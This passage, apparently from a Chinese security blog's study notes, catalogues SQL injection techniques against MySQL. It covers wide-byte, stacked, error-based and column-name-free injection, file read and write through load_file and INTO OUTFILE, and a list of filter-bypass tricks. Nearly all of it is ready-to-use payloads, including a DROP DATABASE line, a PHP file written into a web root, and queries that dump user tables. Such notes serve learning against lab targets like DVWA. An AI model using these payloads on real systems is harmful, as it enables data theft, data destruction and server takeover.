title="宽字节注入"></a>宽字节注入</h4><p>宽字节就是两个以上的字节，宽字节注入产生的原因就是各种字符编码的不当操作</p><p>通常来说，一个gbk编码汉字，占用2个字节。一个utf-8编码的汉字，占用3个字节。因此当我们输入’时，在php代码中如果有过滤的话会利用转义字符\进行转义，而利用urlencode表示的话，就为%5c%27，我们若想要将%5c去掉，则若此时mysql用的是GBK编码，则可以在前面加上一个编码如**%df**，使得系统认定%df%5c表示着一个汉字。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1%df%27union select 1,2,group_concat(column_name)from information_schema.columns where table_name=%df&#x27;users %df&#x27;--+</span><br></pre></td></tr></table></figure><h4 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h4><p>使用前提：堆叠注入使用的条件很苛刻，会受到API以及数据库引擎，或者是权限的限制。只有当调用数据库的函数支持执行多条SQL语句的时候才可以使用。例如 <strong>mysqli_multi_query()</strong> 函数就支持多条SQL语句同时执行，而 mysqli_query() 函数就不支持。在实际应用中，大多数都使用的是 <strong>mysqli_query()</strong> 函数，所以能使用堆叠注入的说明该网站做的很不成功，因为堆叠注入的爆破效果太好了。一般PHP搭建的网站为了防止SQL注入都会使用 mysqli_query() 函数。</p><p>利用方式:在我们输入的语句后面加上分号表示该语句结束，之后再输入另一条语句就可以了。例如可以先写一个查询语句，之后加分号表示查询结束，再在分号后输入删除语句。这样就叫堆叠注入。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=show database();drop database &lt;数据库名&gt;;</span><br></pre></td></tr></table></figure><h4 id="文件读取写入注入"><a href="#文件读取写入注入" class="headerlink" title="文件读取写入注入"></a>文件读取写入注入</h4><h5 id="文件读取"><a href="#文件读取" class="headerlink" title="文件读取"></a>文件读取</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">union select 1,2,load_file(&#x27;文件路径&#x27;)</span><br><span class="line">union select 1,2,load_file(&#x27;D:/test.txt&#x27;)</span><br><span class="line">?id=-1 union%20select 1,2,load_file(%27D:/BaiduNetdiskDownload/phpstudy/phpstudy_pro/tet.txt%27)</span><br><span class="line"> （%20是换行，%27是引号，有路径时，防止转义可以将\改为\\或者/）</span><br></pre></td></tr></table></figure><h5 id="文件写入"><a href="#文件写入" class="headerlink" title="文件写入"></a>文件写入</h5><p><strong><code>union select 1,&#39;&lt;?php phpinfo();?&gt;&#39;,3 into outfile &#39;文件路径&#39; --+</code></strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">union select 1,&#x27;&lt;?php phpinfo();?&gt;&#x27;,3 into outfile &#x27;E:\\phpStudy\\WWW\\sqli\\Less-7\\1.php&#x27; --+</span><br><span class="line">此时就将 phpinfo() 的内容写入 E:\phpStudy\WWW\sqli\Less-7 路径下并创建一个1.php文件</span><br></pre></td></tr></table></figure><h4 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h4><p><strong>updatexml（）函数</strong></p><ul><li>updatexml（）是一个使用不同的xml标记匹配和替换xml块的函数。</li><li>作用：改变文档中符合条件的节点的值</li><li>语法： updatexml（XML_document，XPath_string，new_value） 第一个参数：是string格式，为XML文档对象的名称，文中为Doc 第二个参数：代表路径，Xpath格式的字符串例如&#x2F;&#x2F;title【@lang】 第三个参数：string格式，替换查找到的符合条件的数据</li><li>updatexml使用时，当xpath_string格式出现错误，mysql则会爆出xpath语法错误（xpath syntax）</li><li>例如： select * from test where ide &#x3D; 1 and (updatexml(1,0x7e,3)); 由于0x7e是~，不属于xpath语法格式，因此报出xpath语法错误。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">爆出数据库</span><br><span class="line">1&#x27; and updatexml(1,concat(0x7e,database(),0x7er),1)#</span><br><span class="line"></span><br><span class="line">爆当前数据库表信息</span><br><span class="line">1&#x27; and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1) #</span><br><span class="line"></span><br><span class="line">爆user表字段信息</span><br><span class="line">1&#x27; and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=&#x27;dvwa&#x27; and table_name=&#x27;users&#x27;),0x7e),1) #</span><br><span class="line"></span><br><span class="line">爆数据库内容、、</span><br><span class="line">1&#x27; and updatexml(1,concat(0x7e,(select group_concat(first_name,0x7e,last_name) from dvwa.users)),1) #</span><br></pre></td></tr></table></figure><p>extractvalue()函数其实与updatexml()函数大同小异，都是通过xpath路径错误报错</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">爆出数据库</span><br><span class="line">1&#x27; and extractvalue(1,concat(0x7e,user(),0x7e,database())) #</span><br><span class="line"></span><br><span class="line">爆当前数据库表信息</span><br><span class="line">1&#x27; and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()))) #</span><br><span class="line"></span><br><span class="line">爆user表字段信息</span><br><span class="line">1&#x27; and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27;))) #</span><br><span class="line"></span><br><span class="line">爆数据库内容、、</span><br><span class="line">1&#x27; and extractvalue(1,concat(0x7e,(select group_concat(user_id,0x7e,first_name,0x3a,last_name) from dvwa.users))) #</span><br></pre></td></tr></table></figure><h3 id="handler命令注入"><a href="#handler命令注入" class="headerlink" title="handler命令注入"></a>handler命令注入</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">HANDLER tbl_name OPEN [ [AS] alias]</span><br><span class="line">HANDLER tbl_name READ index_name &#123; = | &lt;= | &gt;= | &lt; | &gt; &#125; (value1,value2,…) [ WHERE where_condition ] [LIMIT … ]</span><br><span class="line">HANDLER tbl_name READ index_name &#123; FIRST | NEXT | PREV | LAST &#125; [ WHERE where_condition ] [LIMIT … ]</span><br><span class="line">HANDLER tbl_name READ &#123; FIRST | NEXT &#125; [ WHERE where_condition ] [LIMIT … ]</span><br><span class="line">HANDLER tbl_name CLOSE</span><br></pre></td></tr></table></figure><h3 id="无列名注入"><a href="#无列名注入" class="headerlink" title="无列名注入"></a>无列名注入</h3><p>sql注入一般都会用到information_schema这个库（mysql自带的库），所以ban掉这个表是一个很好的防御手段，这时候就可以使用无列名注入来绕过。</p><h4 id="information-schema库中的表："><a href="#information-schema库中的表：" class="headerlink" title="information_schema库中的表："></a>information_schema库中的表：</h4><ul><li><p>SCHEMATA表：提供了当前MySQL实例中所有数据库的信息。是s<code>how databases</code>的结果取之此表。</p></li><li><p>TABLES表：提供了关于数据库中的表的信息（包括视图）。详细表述了某个表属于哪个schema，表类型，表引擎，创建时间等信息。是<code>show tables from schemaname</code>的结果取之此表。</p></li><li><p>COLUMNS表：提供了表中的列信息。详细表述了某张表的所有列以及每个列的信息。是<code>show columns from schemaname.tablename</code>的结果取之此表。</p></li><li><p>STATISTICS表：提供了关于表索引的信息。是<code>show index from schemaname.tablename</code>的结果取之此表。</p></li><li><p>USER_PRIVILEGES（用户权限）表：给出了关于全程权限的信息。该信息源自mysql.user授权表。是非标准表。</p></li><li><p>SCHEMA_PRIVILEGES（方案权限）表：给出了关于方案（数据库）权限的信息。该信息来自mysql.db授权表。是非标准表。</p></li><li><p>TABLE_PRIVILEGES（表权限）表：给出了关于表权限的信息。该信息源自mysql.tables_priv授权表。是非标准表。</p></li><li><p>COLUMN_PRIVILEGES（列权限）表：给出了关于列权限的信息。该信息源自mysql.columns_priv授权表。是非标准表。</p></li><li><p>CHARACTER_SETS（字符集）表：提供了mysql实例可用字符集的信息。是<code>SHOW CHARACTER SET</code>结果集取之此表。</p></li><li><p>COLLATIONS表：提供了关于各字符集的对照信息。</p></li><li><p>COLLATION_CHARACTER_SET_APPLICABILITY表：指明了可用于校对的字符集。这些列等效于<code>SHOW COLLATION</code>的前两个显示字段。</p></li><li><p>TABLE_CONSTRAINTS表：描述了存在约束的表。以及表的约束类型。</p></li><li><p>KEY_COLUMN_USAGE表：描述了具有约束的键列。</p></li><li><p>ROUTINES表：提供了关于存储子程序（存储程序和函数）的信息。此时，ROUTINES表不包含自定义函数（UDF）。名为“mysql.proc name”的列指明了对应于INFORMATION_SCHEMA.ROUTINES表的mysql.proc表列。</p></li><li><p>VIEWS表：给出了关于数据库中的视图的信息。需要有show views权限，否则无法查看视图信息。</p></li><li><p>TRIGGERS表：提供了关于触发程序的信息。必须有super权限才能查看该表</p><p>在mysql 5.5.8之后开始使用InnoDb作为默认引擎，<strong>mysql 5.6</strong>的InnoDb增加了<strong>innodb_index_stats</strong>和<strong>innodb_table_stats</strong>两张表</p><p>这两张表记录了数据库和表的信息，但是没有列名</p><p>MySQL 5.7开始增加了sys库，这个库可以用于快速了解系统元数据信息。sys库通过视图的形式把information_schema和performance_schema结合起来，查询令人容易理解的数据。</p><p>sys库的两种形式：</p><p>1.正常的：schema_table_statistics_with_buffer（适合人阅读）</p><p>2.以x$开头：x$schema_table_statistics_with_buffer（适合工具采集数据）</p><p>上述的innodb引擎的表和sys库的表都无法查到列名，这里就需要使用无列名注入。</p><h3 id="使用子查询进行SQL注入"><a href="#使用子查询进行SQL注入" class="headerlink" title="使用子查询进行SQL注入"></a>使用子查询进行SQL注入</h3><p>利用union联合查询构造列名</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users</span><br></pre></td></tr></table></figure><p>把列名变成了1、2、3、4</p><img src="/2024/11/11/sql%E6%B3%A8%E5%85%A5/3023974-20240221130236046-1701495395.png" class="" title="image-20240221130237890"><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> `<span class="number">2</span>` <span class="keyword">from</span> (<span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users)a</span><br><span class="line"><span class="keyword">select</span> a<span class="number">.2</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users)a</span><br><span class="line">#记得第一个<span class="number">2</span>加反引号,或者使用a<span class="number">.2</span></span><br></pre></td></tr></table></figure><p>即从左向右进行查询获取所需的信息</p><img src="/2024/11/11/sql%E6%B3%A8%E5%85%A5/3023974-20240221130553045-291843630.png" class="" title="image-20240221130554759"><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> id<span class="operator">=</span><span class="string">&#x27;-1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,group_concat(`<span class="number">3</span>`) <span class="keyword">from</span> (<span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">user</span>)x;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> id<span class="operator">=</span><span class="string">&#x27;-1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,group_concat(x<span class="number">.3</span>) <span class="keyword">from</span> (<span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users)x;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> id<span class="operator">=</span><span class="string">&#x27;-1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,group_concat(x.c) <span class="keyword">from</span> (<span class="keyword">select</span> (<span class="keyword">select</span> <span class="number">1</span>)a,(<span class="keyword">select</span> <span class="number">2</span>)b,(<span class="keyword">select</span> <span class="number">3</span>)c <span class="keyword">union</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users)x;</span><br></pre></td></tr></table></figure></li></ul><h3 id="SQL注入绕过"><a href="#SQL注入绕过" class="headerlink" title="SQL注入绕过"></a>SQL注入绕过</h3><h4 id="1-注释字符绕过"><a href="#1-注释字符绕过" class="headerlink" title="1.注释字符绕过"></a><strong>1.注释字符绕过</strong></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">-- 注释内容</span><br><span class="line"># 注释内容      url编码为%23</span><br><span class="line">/*注释内容*/</span><br><span class="line">;</span><br><span class="line">/x00</span><br></pre></td></tr></table></figure><h4 id="2-双写绕过"><a href="#2-双写绕过" class="headerlink" title="2.双写绕过"></a><strong>2.双写绕过</strong></h4><p>绕过场景：代码使用replace将字符代替为空时使用</p><p>例如，过滤了select</p><p>使用<code>selselectect =&gt;select</code></p><h4 id="3-大写绕过"><a href="#3-大写绕过" class="headerlink" title="3.大写绕过"></a><strong>3.大写绕过</strong></h4><p>在正则匹配对大小写不敏感时，也就是正则匹配使用了<code>\i</code>，忽略了大小写。而Mysql对大小写也不敏感时使用</p><p>例如，</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/select/i</span><br><span class="line"></span><br><span class="line">使用SeLect进行绕过</span><br></pre></td></tr></table></figure><h4 id="4-内联注释"><a href="#4-内联注释" class="headerlink" title="4.内联注释"></a><strong>4.内联注释</strong></h4><p><strong>内联注释的作用是增加SQL语句的可移植性。比如，将MySQL特有的语法使用内联注释的形式来编写，在这种情况下，MySQL可以正常的解析并执行内联注释中的代码，但是其它的SQL服务器则忽略内联注释中的内容。</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/*! MySQL特有的语法 */</span><br></pre></td></tr></table></figure><p>例如MySQL服务器可以在以下语句中识别<code>STRAIGHT_JOIN</code>关键字，而其他服务器则不能：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT /*! STRAIGHT_JOIN*/ col1 FROM table1,table2 WHERE ...</span><br></pre></td></tr></table></figure><p>&#x2F;*! *&#x2F;类型的注释，内部语句会被执行</p><p>一般用来绕过空格</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select bbb from table1 where aaa=&#x27;&#x27; union /*! select database()*/;</span><br></pre></td></tr></table></figure><h4 id="5-特殊编码绕过"><a href="#5-特殊编码绕过" class="headerlink" title="5.特殊编码绕过"></a><strong>5.特殊编码绕过</strong></h4><p>16进制编码绕过</p><p>如果在查询字段名的时候表名被过滤，或者是数据库中某些特定字符被过滤，则可以使用16进制绕过。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select column_name from information_schema.columns where table_name=0x7573657273;</span><br></pre></td></tr></table></figure><p><code>0x7573657273</code>为users的16进制编码</p><h4 id="6-双重url编码绕过"><a href="#6-双重url编码绕过" class="headerlink" title="6.双重url编码绕过"></a><strong>6.双重url编码绕过</strong></h4><p>对字符串进行二次url编码，可绕过关键字过滤</p><h4 id="7-空格绕过"><a href="#7-空格绕过" class="headerlink" title="7.空格绕过"></a><strong>7.空格绕过</strong></h4><p>可以使用%0d(回车)、%0a(换行)、%09(tab制表)、&#x2F;**&#x2F;、%a0(&amp;nbsp）、%0b(垂直制表符)、%0c（换页符）</p><h4 id="8-过滤了-and、or、-、-、"><a href="#8-过滤了-and、or、-、-、" class="headerlink" title="8.过滤了 and、or、&#x3D;、&gt;、&lt;、regexp"></a>8.过滤了 and、or、&#x3D;、&gt;、&lt;、regexp</h4><p>使用 &amp;&amp;、||、 like、greatest(返回值的最大值)、least（返回值的最小值）</p><h4 id="9-过滤了逗号"><a href="#9-过滤了逗号" class="headerlink" title="9.过滤了逗号"></a><strong>9.过滤了逗号</strong></h4><p>limit使用from或者offset</p><p>select substr(database(0from1for1);select mid(database(0from1for1);</p><p>substr使用from for</p><p>select * from news limit 0,1 &lt;&#x3D;&gt; select * from news limit 1 offset 0</p><p>if语句使用exp()函数代替</p><p>exp()函数除了能用在报错注入以外，利用exp在参数大于709时会报错的特性可以用来构造条件判断语句</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">||exp(710-(... rlike ...))</span><br></pre></td></tr></table></figure><p>即如果 <code>(... rlike ...)</code> 中的语句执行匹配后的结果为<code>True</code>，经过减号转换后为 <code>exp(710-1)</code> 后不会溢出；若为<code>false</code>，转换为 <code>exp(710-0)</code> 后则会溢出并报错</p><h4 id="10、绕过注释符号（-，–）过滤"><a href="#10、绕过注释符号（-，–）过滤" class="headerlink" title="10、绕过注释符号（#，–）过滤"></a><strong>10、绕过注释符号（#，–）过滤</strong></h4><p>使用单引号、双引号进行引号闭合绕过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM users WHERE id=&#x27;$_POST[id]&#x27; LIMIT 0,1</span><br></pre></td></tr></table></figure><p>我们传入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1&#x27; and 1=2 union select 1,2,3&#x27; </span><br></pre></td></tr></table></figure><p>这样语句就变成了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM users WHERE id=&#x27;1&#x27; and 1=2 union select 1,2,3&#x27; &#x27; LIMIT 0,1</span><br></pre></td></tr></table></figure><p>引号正常闭合</p><h4 id="11、绕过union，select，where等"><a href="#11、绕过union，select，where等" class="headerlink" title="11、绕过union，select，where等"></a>11、绕过union，select，where等</h4><p>可尝试在关键字内插入&#x2F;**&#x2F;</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">U/**/NION/**/SE/**/LECT/**/user，pwd from user</span><br><span class="line"></span><br><span class="line">union select user,pwd from user</span><br></pre></td></tr></table></figure><h4 id="12-等价函数绕过"><a href="#12-等价函数绕过" class="headerlink" title="12.等价函数绕过"></a>12.等价函数绕过</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">hex()、bin() ==&gt; ascii()</span><br><span class="line">sleep() ==&gt;benchmark()</span><br><span class="line">concat_ws()==&gt;group_concat()</span><br><span class="line">mid()、substr() ==&gt; substring()</span><br><span class="line">@@user ==&gt; user()</span><br><span class="line">@@datadir ==&gt; datadir()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
